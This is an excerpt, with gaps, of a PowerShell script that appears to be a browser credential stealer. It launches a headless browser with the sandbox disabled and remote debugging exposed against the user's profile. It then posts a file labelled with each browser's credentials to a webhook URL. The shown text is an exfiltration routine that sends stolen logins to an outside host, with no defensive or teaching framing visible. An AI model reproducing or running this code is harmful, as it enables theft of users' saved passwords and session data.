...
function Start-BrowserDebug {
    ...
    $psi.Arguments = "--headless=new --no-sandbox --disable-gpu --disable-extensions --disable-dev-shm-usage --remote-debugging-port=$DEBUG_PORT --remote-debugging-address=127.0.0.1 --remote-allow-origins=* --no-default-browser-check --no-first-run --user-data-dir=`"$UserDataPath`""
    ...
    try {
        ...
        foreach ($browserName in $AllResults.Keys) {
            ...
            try {
                ...
                $form = @{
                    content = "**$browserName Credentials**"
                    file    = Get-Item $tmpFile
                }
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $form -ErrorAction Stop | Out-Null
